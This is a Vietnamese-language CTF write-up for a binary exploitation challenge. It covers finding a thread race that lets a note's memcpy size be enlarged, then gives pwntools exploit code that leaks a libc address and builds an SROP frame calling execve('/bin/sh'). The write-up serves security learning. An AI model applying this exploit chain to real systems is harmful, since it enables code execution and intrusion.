**1. Find Bug**
 a, Xem qua chương trình bằng ida
  - ![image](https://user-images.githubusercontent.com/113702087/214768349-f4253b21-1fa8-4470-a735-24fb37c61be3.png)
  - main:
    + chương trình tạo 1 addr bằng shmat, phân vùng địa chỉ là libc
    + đồng thời start 2 thread start_routine(s) và notes(s) chung 1 arg
  - start_routine
  - ![image](https://user-images.githubusercontent.com/113702087/214768955-a3c8256b-e650-422b-8932-ae6334fb532f.png)
  - khi arr[28] = 0 thì start_routine gần như vô hại. Nhưng ta có thể thấy ở bên dưới
  - check
  - ![image](https://user-images.githubusercontent.com/113702087/214768978-25087f51-149c-4427-a984-8e0508da97fd.png)
  - hàm này thực thi memcpy, nếu như ta control được size có thể gây ra lỗi overflow
  - notes
  - ![image](https://user-images.githubusercontent.com/113702087/214769377-c7b814e9-be59-40b4-8ec4-6041e41de01c.png)
  - trong notes có vẻ có nhiều hàm nhưng tôi chỉ quan tâm đến store, upgrade và print
  - store
  - ![image](https://user-images.githubusercontent.com/113702087/214769455-4660bda7-6d07-4f83-b02a-a35592f23be1.png)
  - tại đây arr[28] được set bằng 1, do đó check sẽ được thực thi
 b, Debug
  - đặt bp tại memcpy đễ dễ quan sát
  - ![image](https://user-images.githubusercontent.com/113702087/214771089-7437f6ae-78c7-4c39-8606-f7b078851163.png)
  - có vẻ như khi size > 64 thì chương trình sẽ exit
  - ![image](https://user-images.githubusercontent.com/113702087/214771162-71aea37f-7539-4556-9e5f-f9c4b99e87f1.png)
  - ![image](https://user-images.githubusercontent.com/113702087/214771272-e9c5f2b3-5e7c-4ddc-816d-e2ddbd6e24bd.png)
  - vì là 2 thread chạy độc lập nhau và check được thực thi khi notes được nhập xong
  - do đó tôi đã thực thi store 1 lần nữa sau 2 giây để xem kết quả như nào
  - ![image](https://user-images.githubusercontent.com/113702087/214772013-98b94933-df2d-4fd6-9bb2-8924c94fd47e.png)
  - ![image](https://user-images.githubusercontent.com/113702087/214772062-d5c03284-8826-448a-84c2-96b23e5e7cb5.png)
  - và đây là kết quả sau 2 lần nhập
  - ![image](https://user-images.githubusercontent.com/113702087/214772095-f1797e73-84f9-4c6d-8430-97636403537b.png)
  - vậy là tôi có thể control được savedrip rồi và thực thi srop execve('/bin/sh', 0, 0)

**2. Exploit**
 ```
 binsh_off = 0x274251
libc_off = 0x270041
    
payload = b'/bin/sh\x00' + b'a'*56
store(0, b'chino', 64, payload)

# upgrade
r.recvuntil(b'Sent!\n')
sleep(3)
r.sendline(b'4')
r.sendline(b'5000')
r.send(b'chino')

# leak libc
delandshow(3, 0)
out = r.recvuntil(b'\x7f')
print(out)
size = len(out)
libc_leak = out[size-6:size]
libc = u64(libc_leak + b'\x00'*2)
print(hex(libc))
libc_base = libc - libc_off
binsh = libc - binsh_off
print(hex(libc_base))
print(hex(binsh))
 ```
 - Đầu tiên tôi sẽ leak libc vì địa chỉ cấp phát trên ở libc và ghi chuỗi /bin/sh cũng như có địa chỉ của nó
 - tạo 1 note bằng store rồi đợi tâm 3s dùng upgrade để chỉnh lại size thành 5000 rồi in ra
 - ![image](https://user-images.githubusercontent.com/113702087/214776413-40ff9549-f9de-4abf-a109-7f13163dd28f.png)
 - nó được cấp phát tại 0x00007ffff7ffa000 và sẽ in ra các địa chỉ libc trong ld
 ```
 store(0, b'chino', 64, payload)
sleep(2)
payload += b'a'*8 + p64(pop_rdi) + p64(0xf) + p64(exe.sym['syscall'])

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = syscall
payload += bytes(frame)
store(0, b'chino', 0x1000, payload)
 ```
 - tạo lại 1 notes nhằm thực thi check 1 lần nữa, rồi đợi 2s để pass qua if rồi gửi lại notes có SROP
 - get shell
 - ![image](https://user-images.githubusercontent.com/113702087/214777198-3eb2890b-52e1-49c2-8f06-acda049564b8.png)
 - bài này chưa down libc về nên sài libc trong máy :>
